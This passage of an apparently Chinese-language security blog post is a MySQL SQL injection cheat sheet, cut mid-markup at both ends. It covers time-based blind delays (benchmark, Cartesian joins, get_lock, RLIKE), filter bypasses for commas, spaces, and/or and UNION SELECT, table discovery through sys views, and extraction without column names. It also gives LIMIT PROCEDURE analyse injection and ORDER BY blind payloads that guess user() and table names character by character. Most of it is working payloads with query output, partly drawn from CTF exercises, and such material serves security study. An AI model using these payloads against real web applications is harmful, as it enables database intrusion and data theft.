class="line"><span class="operator">|</span> benchmark(<span class="number">10000000</span>,sha(<span class="number">1</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span>                          <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2.02</span> sec)</span><br><span class="line"></span><br><span class="line">笛卡尔积</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="number">0</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="number">0</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                                    <span class="number">41809156</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.08</span> sec)</span><br><span class="line"></span><br><span class="line">GET_LOCK</span><br><span class="line">在一个session中可以先锁定一个变量例如：<span class="keyword">select</span> get_lock(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">然后通过另一个session 再次执行get_lock函数 <span class="keyword">select</span> get_lock(<span class="string">&#x27;admin&#x27;</span>,<span class="number">5</span>),此时会产生<span class="number">5</span> 秒的延迟，其效果类似于sleep(<span class="number">5</span>)。</span><br><span class="line">但是利用场景是有条件限制的：需要提供长连接。在Apache<span class="operator">+</span>PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200703150557543.png" alt="image-20200703150557543"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RLIKE<span class="operator">/</span>REGEXP</span><br><span class="line">通过rpad或repeat构造长字符串，加以计算量大的<span class="keyword">pattern</span>，通过repeat的参数可以控制延时长短。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                           <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">6.63</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) regexp concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) regexp concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                            <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">6.75</span> sec)</span><br></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user();</span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(user() from -1);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(user() from -1) |</span><br><span class="line">+---------------------+</span><br><span class="line">| t                   |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(user() from -2);</span><br><span class="line">+---------------------+</span><br><span class="line">| mid(user() from -2) |</span><br><span class="line">+---------------------+</span><br><span class="line">| st                  |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="数字型过滤and-or"><a href="#数字型过滤and-or" class="headerlink" title="数字型过滤and or"></a>数字型过滤and or</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1/(select sleep(3));</span><br><span class="line">Empty set, 17 warnings (51.06 sec)</span><br></pre></td></tr></table></figure><h2 id="无information-schema找表名的替代方法"><a href="#无information-schema找表名的替代方法" class="headerlink" title="无information_schema找表名的替代方法"></a>无information_schema找表名的替代方法</h2><p><a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">Alternatives to Extract Tables and Columns from MySQL and MariaDB</a><br>需要mysql版本&gt;5.7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from sys.x$schema_flattened_keys;</span><br><span class="line">+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+</span><br><span class="line">| table_schema | table_name            | index_name      | non_unique | subpart_exists | index_columns                     |</span><br><span class="line">+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+</span><br><span class="line">| security     | emails                | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">| security     | referers              | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">| security     | uagents               | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">| security     | users                 | PRIMARY         |          0 |              0 | id                                |</span><br><span class="line">+--------------+-----------------------+-----------------+------------+----------------+-----------------------------------+</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from sys.schema_table_statistics;</span><br></pre></td></tr></table></figure><h2 id="在没有列名的情况下检索数据"><a href="#在没有列名的情况下检索数据" class="headerlink" title="在没有列名的情况下检索数据"></a>在没有列名的情况下检索数据</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-87b723085b589735.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM USERS WHERE ID =1;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 123      | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; SELECT * FROM USERS WHERE ID = ((select 1,123,&#x27;Dumb&#x27;) &lt;= (select * from users limit 1));</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 123      | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM USERS WHERE ID = ((select 2,123,&#x27;Dumb&#x27;) &lt;= (select * from users limit 1));</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过小于号替换等号，可以逐字符检索出数据。不过还有一个问题——<code>MySQL中的字符串比较在默认情况下是不区分大小写的</code>。</p><p>将字符串转换为二进制格式后，会强制进行字节对字节的比较</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;d&#x27;=&#x27;D&#x27;;</span><br><span class="line">+---------+</span><br><span class="line">| &#x27;d&#x27;=&#x27;D&#x27; |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)  </span><br><span class="line">mysql&gt; select BINARY(&#x27;d&#x27;)&gt;BINARY(&#x27;D&#x27;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| BINARY(&#x27;d&#x27;)&gt;BINARY(&#x27;D&#x27;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select 1,123,BINARY(&#x27;dumb&#x27;)) &lt;= (select * from users limit 1);</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| (select 1,123,BINARY(&#x27;dumb&#x27;)) &lt;= (select * from users limit 1) |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">|                                                              0 |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>不过<code>BINARY</code>中含有关键字<code>in</code>。<br>MySQL中的JSON对象是二进制对象，因此，<code>CAST(0 AS JSON)</code>会返回一个二进制字符串，进而<code>SELECT CONCAT(“A”, CAST(0 AS JSON))</code>也会返回一个二进制字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CAST (expression AS data_type)</span><br><span class="line">参数说明：</span><br><span class="line"></span><br><span class="line">expression：任何有效的SQServer表达式。</span><br><span class="line">AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。</span><br><span class="line">data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-2d89a0118547c34c.png" alt="image.png"></p><h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p>通常注入利用的姿势不是靠一个点就可以突破的，往往需要结合许多姿势技巧</p><p>mysql的注入过程中，我们用得到的一些：<br>常量：<code>true， false， null， \N, current_timestamp</code><br>变量：<code>@myvar:=1</code></p><p>系统变量：<code>@@version, @@datadir....</code></p><p>常用函数：<code>version(), pi(), pow(), char(), substring()</code></p><p>字符串生成：<code>hex(), conv()</code></p><p> 有关于字符串生成的一些基础字符(其余的字符可以由此扩展)：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span><span class="operator">=</span><span class="number">1</span>,<span class="built_in">floor</span>(pi())<span class="operator">=</span><span class="number">3</span>,<span class="built_in">ceil</span>(pi())<span class="operator">=</span><span class="number">4</span>,<span class="built_in">floor</span>(version())<span class="operator">=</span><span class="number">5</span>,<span class="built_in">ceil</span>(version())<span class="operator">=</span><span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="1、过滤的绕过"><a href="#1、过滤的绕过" class="headerlink" title="1、过滤的绕过"></a>1、过滤的绕过</h3><p>过滤空格：<code>%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释</code></p><p>过滤and，or：||，&amp;&amp;</p><p>union select：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用括号，<span class="string">&#x27;and(true)like(false)union(select(pass)from(users))，</span></span><br><span class="line"><span class="string">方括号union [all|distinct] select pass from users#，</span></span><br><span class="line"><span class="string">union%a0select pass from users，</span></span><br><span class="line"><span class="string">或者内联注释union/*&amp;sort=*/select pass from users#</span></span><br></pre></td></tr></table></figure><p>union：<code>子查询进行盲注and length((select pass from users having substr(pass,1,1)=&#39;a&#39;))</code></p><p>having：<code>and(select substr(group_concat(pass),1,1)from users)=&#39;a</code></p><p>select … from(过滤代码如&#x2F;SELECT\s+[A-Za-z.]+\s+FROM&#x2F;i&#x2F;i)：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">all</span><span class="operator">|</span><span class="keyword">distinct</span>] pass <span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span>`table_name`<span class="keyword">from</span>`information_schema` . `tables`</span><br><span class="line"><span class="keyword">select</span> pass <span class="keyword">as</span> alias <span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span> pass aliasalias <span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span> pass`alias alias`<span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">select</span><span class="operator">+</span>pass<span class="operator">%</span>a0from(users)</span><br></pre></td></tr></table></figure><p>and,&amp;,or,|：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里就是可以利用上文中提到的<span class="literal">false</span>注入的方式进行绕过</span><br><span class="line">可以通过字符串比较引入查询</span><br><span class="line">譬如<span class="string">&#x27;=1=(select .....)</span></span><br></pre></td></tr></table></figure><p>过滤逗号：<code>&#39; and substr(data from 1 for 1) = &#39;a&#39;#</code></p><h3 id="2、技巧"><a href="#2、技巧" class="headerlink" title="2、技巧"></a>2、技巧</h3><h3 id="2-1、like"><a href="#2-1、like" class="headerlink" title="2.1、like"></a>2.1、like</h3><p>有时候我们可以利用一些逻辑语句进行注入例如在最近的0ctf上的Temmo’s Tiny Shop这个题中，我们在搜索的时候推测出语句是在like后的，就可以通过left来进行like盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((<span class="keyword">select</span>(<span class="keyword">left</span>((<span class="keyword">select</span>(flag)<span class="keyword">from</span>(ce63e444b0d049e9c899c9a0336b3c59)),<span class="number">3</span>))<span class="keyword">like</span>(<span class="number">0x2562</span>)),name,price)</span><br></pre></td></tr></table></figure><h3 id="2-2、Limt"><a href="#2-2、Limt" class="headerlink" title="2.2、Limt"></a>2.2、Limt</h3><p>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO是需要写的权限。</p><p>利用PROCEDURE 有两种方式，基于报错和时间的，具体文章见这里<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a></p><p><strong>此方法适用于MySQL 5.x中，在limit语句后面的注入</strong></p><blockquote><p>下面的语句包含了ORDER BY，MySQL当中UNION语句不能在ORDER BY的后面</p><p><strong>在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的。</strong></p></blockquote><p>基于报错：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>基于时间：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-3、order-by"><a href="#2-3、order-by" class="headerlink" title="2.3、order by"></a>2.3、order by</h3><p>order by 后的数字可以作为一个注入点。具体可以看这个文章<a href="https://www.secpulse.com/archives/57197.html">MySQL Order By 注入总结</a></p><p>这里可以用一些判断和返回值进行利用，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,name,price) 通过name字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,name,price) 通过price字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>name<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>price<span class="operator">+</span><span class="keyword">END</span>) 通过name字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">CASE</span><span class="operator">+</span><span class="keyword">WHEN</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)<span class="operator">+</span><span class="keyword">THEN</span><span class="operator">+</span>name<span class="operator">+</span><span class="keyword">ELSE</span><span class="operator">+</span>price<span class="operator">+</span><span class="keyword">END</span>) 通过price字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IFNULL(<span class="keyword">NULL</span>,price) 通过price字段排序</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IFNULL(<span class="keyword">NULL</span>,name) 通过name字段排序</span><br></pre></td></tr></table></figure><p>还可以用rand函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>rand(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>rand(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>通常这里我们是不知道列名的，那可以通过报错进行利用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>information_schema.tables)) 正常</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>IF(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>information_schema.tables)) 错误</span><br><span class="line"></span><br><span class="line">利用regexp</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正常</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line"></span><br><span class="line">利用updatexml</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>updatexml(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>updatexml(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>()),<span class="number">1</span>) 错误</span><br><span class="line"></span><br><span class="line">利用extractvalue</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,<span class="keyword">user</span>())) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>extractvalue(<span class="number">1</span>,if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,<span class="keyword">user</span>())) 错误</span><br><span class="line"></span><br><span class="line">利用sleep</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,<span class="number">1</span>,(<span class="keyword">SELECT</span>(<span class="number">1</span>)<span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(SLEEP(<span class="number">2</span>)))test)) 正常响应时间</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">SELECT</span>(<span class="number">1</span>)<span class="keyword">FROM</span>(<span class="keyword">SELECT</span>(SLEEP(<span class="number">2</span>)))test)) sleep <span class="number">2</span>秒</span><br><span class="line"></span><br><span class="line">数据猜解</span><br><span class="line">通过下可以得知<span class="keyword">user</span>()第一位为r,ascii码的<span class="number">16</span>进制为<span class="number">0x72</span>：</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x72</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x71</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line">猜解当前数据库的表名：</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(table_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span></span><br><span class="line">table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x67</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 正确</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span class="operator">=</span>(<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">+</span>regexp<span class="operator">+</span>if(<span class="built_in">substring</span>((<span class="keyword">select</span><span class="operator">+</span>concat(table_name)<span class="keyword">from</span><span class="operator">+</span>information_schema.tables<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span></span><br><span class="line">table_schema<span class="operator">%</span><span class="number">3</span>ddatabase()<span class="operator">+</span>limit<span class="operator">+</span><span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">0x66</span>,<span class="number">1</span>,<span class="number">0x00</span>)) 错误</span><br><span class="line">猜解指定表名中的列名：</span><br><span class="line"><span class="operator">/</span>?<span class="keyword">order</span><span 